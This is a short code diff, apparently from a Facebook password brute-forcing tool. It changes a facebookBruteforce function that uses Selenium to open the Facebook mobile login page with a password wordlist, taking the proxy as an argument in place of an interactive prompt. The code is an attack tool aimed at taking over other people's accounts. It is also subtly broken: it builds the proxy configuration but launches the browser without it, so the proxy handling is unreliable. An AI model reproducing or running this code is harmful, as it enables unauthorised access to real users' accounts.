@@ -26,19 +26,18 @@ def facebookCheck(username):
         return 1
 
 
-def facebookBruteforce(username, wordlist, delay):
-    use = raw_input("[>] Use HTTPs proxy? [y/n]: ")
-    if use == 'y':
-        https_proxy = str(raw_input('[>] HTTPs proxy: '))
+def facebookBruteforce(username, wordlist, delay, https_proxy):
+    if https_proxy == False:
+        driver = webdriver.Firefox()
+    else:
+        proxy1 = https_proxy
         proxy = Proxy({
             'proxyType': ProxyType.MANUAL,
-            'httpProxy': https_proxy,
+            'httpProxy': proxy1,
             'ftpProxy': '',
-            'sslProxy': https_proxy,
+            'sslProxy': proxy1,
             'noProxy': '',
         })
-        driver = webdriver.Firefox(proxy=proxy)
-    else:
         driver = webdriver.Firefox()
     driver.get("https://mbasic.facebook.com/login")
     wordlist = open(wordlist, 'r')
